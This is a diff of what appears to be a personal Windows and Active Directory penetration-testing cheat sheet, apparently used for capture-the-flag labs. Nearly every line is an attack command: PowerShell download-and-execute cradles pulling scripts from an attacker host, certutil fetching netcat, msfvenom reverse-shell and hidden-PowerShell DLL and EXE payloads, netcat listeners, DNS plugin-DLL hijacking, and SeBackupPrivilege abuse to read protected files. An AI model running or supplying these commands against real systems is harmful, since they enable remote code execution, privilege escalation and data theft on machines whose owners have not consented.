@@ -1354,13 +1354,17 @@ certutil -urlcache -f http://$MYIP:8888/windows/nc.exe \programdata\nc.exe
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
-powershell -c "whoami /priv"
-Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties MemberOf,AdminCount | Select SamAccountName,AdminCount,@{N='Groups';E={[string]::Join('; ',($_.MemberOf|%{($_ -split ',')[0]-replace '^CN='}))}} | Sort AdminCount -Desc | Format-Table -AutoSize -Wrap
-net user $USERNAME
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.54:8888/whoami.ps1')
+
++---------- Full Privesc Scan ----------+
+IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/PrivescCheck.ps1');Invoke-PrivescCheck
 
 +---------- Switch User: Known Creds ----------+
 rlwrap nc -lvnp 5566
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Command cmd.exe -Remote $MYIP:5566
+
++---------- Restore AD Objects ----------+
+powershell -c "Restore-ADObject -Identity 'GUID or DistinguishedName'"
 
 +---------- SeBackupPrivilege ----------+
 $a = [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$MYIP:8888/windows/SeBackupPrivilegeUtils.dll')); Get-ChildItem C:\Users -Recurse -File -Include user.txt,root.txt | ForEach-Object {$d=Join-Path $env:TEMP "$([guid]::NewGuid()).txt"; [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils]::CopyFile($_.FullName,$d,[ref]$true,$true)>$null; Get-Content $d; Remove-Item $d -Force}
@@ -1379,27 +1383,11 @@ impacket-smbserver share .
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f dll -o 0.dll
 dnscmd.exe /config /serverlevelplugindll \\$MYIP\share\0.dll
 
-+---------- Initial Checks ----------+
-netstat -an | findstr LISTENING
-powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
-powershell -c 'Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.Publisher -and $_.Publisher -notlike """*Microsoft*""" } | Select-Object DisplayName, DisplayVersion, Publisher'
-powershell -c "ls -force \\"
-powershell -c "tree \users /a /f"
-powershell -c "net user $USERNAME"
-powershell -c "tree \inetpub /a /f"
-powershell -c "tree \xampp /a /f"
-powershell -c "tree $env:APPDATA/.. /a /f"
-powershell -c "type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-powershell -c "Get-ScheduledTask | Where-Object {($_.Author -notmatch 'Microsoft') -and ($_.TaskPath -notmatch 'Microsoft')} | Select-Object TaskName, TaskPath, State, Author"
-powershell -c "Get-Service | Where-Object { $_.CanStop -eq $true -and $_.DisplayName -notmatch 'Microsoft|Windows' } | Sort-Object DisplayName"
-powershell -c "Get-ADComputer DC1 -property *"
-powershell -c "Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects"
-powershell -c "Get-ADObject -filter { SAMAccountName -eq 'TempAdmin' } -includeDeletedObjects -property *"
-powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
-powershell -c "if ([Environment]::Is64BitOperatingSystem) { '64-bit' } else { '32-bit' }"
-
-+---------- Full Privesc Scan ----------+
-IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/PrivescCheck.ps1');Invoke-PrivescCheck
++---------- Shell From File ----------+
+msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP>_WEB_DELIVERY' EXITFUNC=none -f dll > x.dll
+msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP>_WEB_DELIVERY' EXITFUNC=none -f exe > x.exe
+rlwrap nc -lvnp 5555
+powershell -c "\programdata\bat2exe.bat $MYIP 5555; \programdata\x.exe"
 
 +---------- Transfer Files from Windows ----------+
 [Convert]::ToBase64String([IO.File]::ReadAllBytes((Get-Location).Path + "\file"))
@@ -1415,15 +1403,6 @@ powershell -c "wmic service get name,displayname,pathname,startmode |findstr /i 
 +---------- Scheduled Tasks ----------+
 powershell -c "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task | Format-List *"
 powershell -c "Start-ScheduledTask -TaskName 'Ownership'"
-
-+---------- DPAPI ----------+
-Get-ChildItem 'C:\Users' -Directory | ForEach-Object { Write-Output "==== $($_.Name) ===="; try { Get-ChildItem "$($_.FullName)\AppData\Roaming\Microsoft" -Recurse -Force -ErrorAction Stop | Select-Object -ExpandProperty FullName } catch { Write-Output "Unable to read." } }
-
-+---------- Shell From File ----------+
-msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP>_WEB_DELIVERY' EXITFUNC=none -f dll > x.dll
-msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP>_WEB_DELIVERY' EXITFUNC=none -f exe > x.exe
-rlwrap nc -lvnp 5555
-powershell -c "\programdata\bat2exe.bat $MYIP 5555; \programdata\x.exe"
 
 +---------- Shell From Memory ----------+
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o 0.ps1
